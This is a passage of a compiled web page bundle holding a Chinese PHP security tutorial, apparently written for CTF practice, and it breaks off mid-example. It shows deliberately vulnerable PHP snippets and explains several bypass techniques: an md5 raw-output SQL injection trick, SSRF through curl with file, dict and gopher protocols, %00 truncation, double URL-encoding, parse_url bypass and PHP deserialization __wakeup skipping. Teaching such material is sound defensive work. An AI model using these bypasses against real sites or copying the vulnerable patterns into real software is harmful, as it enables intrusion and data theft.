",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"sprintf"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")),'"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"die"},"die()",Object(p.b)("a",c({parentName:"h3"},{href:"#die","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数输出一条信息，并退出当前脚本。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"die"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"var_dump"},"var_dump()",Object(p.b)("a",c({parentName:"h3"},{href:"#var_dump","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"var_dump"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"var_export"},"var_export()",Object(p.b)("a",c({parentName:"h3"},{href:"#var_export","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和",Object(p.b)("inlineCode",{parentName:"p"},"var_dump"),"类似，不同的是其返回的表示是合法的 PHP 代码。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"var_export"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200828223749.png",alt:null}))),Object(p.b)("h2",{className:"__internal",id:"php黑魔法"},"PHP黑魔法",Object(p.b)("a",c({parentName:"h2"},{href:"#php%E9%BB%91%E9%AD%94%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这里大部分函数的使用已经在上面详细介绍过了，这里我就针对每一种函数大概介绍一下其主要存在的利用方法。"),Object(p.b)("h3",{className:"__internal",id:"md5"},"md5()",Object(p.b)("a",c({parentName:"h3"},{href:"#md5","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"md5()"),"函数绕过sql注入。我们来看一个例子。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$password"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'password'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$sql")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),"\"SELECT * FROM admin WHERE username = 'admin' and password = '\""),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"md5"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$password"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token boolean constant"}),"true"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),'"\'"'),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$result"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"mysqli_query"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$link"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$sql"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"mysqli_num_rows"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$result"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'flag is :'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$flag"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'密码错误!'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}")))),Object(p.b)("p",null,"这里提交的参数通过",Object(p.b)("inlineCode",{parentName:"p"},"md5"),"函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了",Object(p.b)("inlineCode",{parentName:"p"},"'or'xxxx"),"的格式，不就可以注入了么。",Object(p.b)("inlineCode",{parentName:"p"},"md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c")),Object(p.b)("p",null,"转成字符串为",Object(p.b)("inlineCode",{parentName:"p"},"'or'6xxx")),Object(p.b)("h3",{className:"__internal",id:"eval-1"},"eval()",Object(p.b)("a",c({parentName:"h3"},{href:"#eval-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在执行命令时，可使用分号构造处多条语句。类似这种。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"echo 'a';echo '--------------';echo 'b';\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"ereg"},"ereg()",Object(p.b)("a",c({parentName:"h3"},{href:"#ereg","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"存在",Object(p.b)("inlineCode",{parentName:"p"},"%00"),"截断，当遇到使用此函数来进行正则匹配时，我们可以用",Object(p.b)("inlineCode",{parentName:"p"},"%00"),"来截断正则匹配，从而绕过正则。"),Object(p.b)("h3",{className:"__internal",id:"strcmp"},"strcmp()",Object(p.b)("a",c({parentName:"h3"},{href:"#strcmp","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个在前面介绍过，就是数组绕过技巧。"),Object(p.b)("h3",{className:"__internal",id:"curl_setopt"},"curl_setopt()",Object(p.b)("a",c({parentName:"h3"},{href:"#curl_setopt","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"存在ssrf漏洞。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ch")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"curl_init"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ch"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"CURLOPT_URL"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token shell-comment comment"}),"#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"curl_setopt"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ch"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"CURLOPT_HEADER"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token shell-comment comment"}),"#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"curl_exec"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ch"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"curl_close"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ch"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"使用file协议进行任意文件读取"),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830112047.png",alt:null}))),Object(p.b)("p",null,"除此之外还有dict协议查看端口信息。gopher协议反弹shell利用等。"),Object(p.b)("h3",{className:"__internal",id:"preg_replace-1"},"preg_replace()",Object(p.b)("a",c({parentName:"h3"},{href:"#preg_replace-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数前面详细介绍过，/e模式下的命令执行。"),Object(p.b)("h3",{className:"__internal",id:"urldecode"},"urldecode()",Object(p.b)("a",c({parentName:"h3"},{href:"#urldecode","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"url二次编码绕过。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"urldecode"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'name'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Ameng"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Plase~"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"sorry"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"将Ameng进行二次url编码，然后传入即可得到满足条件。"),Object(p.b)("h3",{className:"__internal",id:"file_get_contents-1"},"file_get_contents()",Object(p.b)("a",c({parentName:"h3"},{href:"#file_get_contents-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"常用伪协议来进行绕过。"),Object(p.b)("h3",{className:"__internal",id:"parse_url"},"parse_url()",Object(p.b)("a",c({parentName:"h3"},{href:"#parse_url","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$url")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"http://www.jlx-love.com/about"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$parts")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"parse_url"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$url"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$parts"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nArray \n    ( \n    [scheme] => http \n    [host] => www.jlx-love.com \t\t[path] => /about \n\t)"))),Object(p.b)("p",null,"可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\\转换为/，从而就会导致",Object(p.b)("inlineCode",{parentName:"p"},"parse_url"),"的白名单绕过。"),Object(p.b)("h2",{className:"__internal",id:"反序列化漏洞"},"反序列化漏洞",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"简介"},"简介",Object(p.b)("a",c({parentName:"h3"},{href:"#%E7%AE%80%E4%BB%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。"),Object(p.b)("p",null,"序列化：把对象转换为字节序列的过程成为对象的序列化。"),Object(p.b)("p",null,"反序列化：把字节序列恢复为对象的过程称为对象的反序列化。"),Object(p.b)("p",null,"归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。"),Object(p.b)("p",null,"在 PHP 中主要就是通过",Object(p.b)("inlineCode",{parentName:"p"},"serialize"),"和",Object(p.b)("inlineCode",{parentName:"p"},"unserialize"),"来实现数据的序列化和反序列化。"),Object(p.b)("p",null,"那么漏洞是如何形成的呢？"),Object(p.b)("p",null,"PHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。"),Object(p.b)("p",null,"那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$who")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Ameng"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"serialize"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),'\n执行结果——>\nO:5:"Ameng":1:{s:3:"who";s:5:"Ameng";}'))),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830141143.png",alt:null}))),Object(p.b)("p",null,"这里还要补充一点，就是关于变量的分类，变量的类别有三种："),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"public：正常操作，在反序列化时原型就行。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"protected：反序列化时在变量名前加上%00*%00。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"private：反序列化时在变量名前加上%00类名%00。")),Object(p.b)("p",null,"序列化我们知道了是个什么格式，那么如何利用反序列化来触发漏洞进行利用呢？"),Object(p.b)("h3",{className:"__internal",id:"__wakeup"},"__wakeup()",Object(p.b)("a",c({parentName:"h3"},{href:"#__wakeup","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在我们反序列化时，会先检查类中是否存在",Object(p.b)("inlineCode",{parentName:"p"},"__wakeup()"),"如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过",Object(p.b)("inlineCode",{parentName:"p"},"__wakeup()"),"执行",Object(p.b)("inlineCode",{parentName:"p"},"__destruct()"),"。"),Object(p.b)("p",null,"影响版本："),Object(p.b)("p",null,"PHP5 < 5.6.25"),Object(p.b)("p",null,"PHP7 < 7.0.10"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," 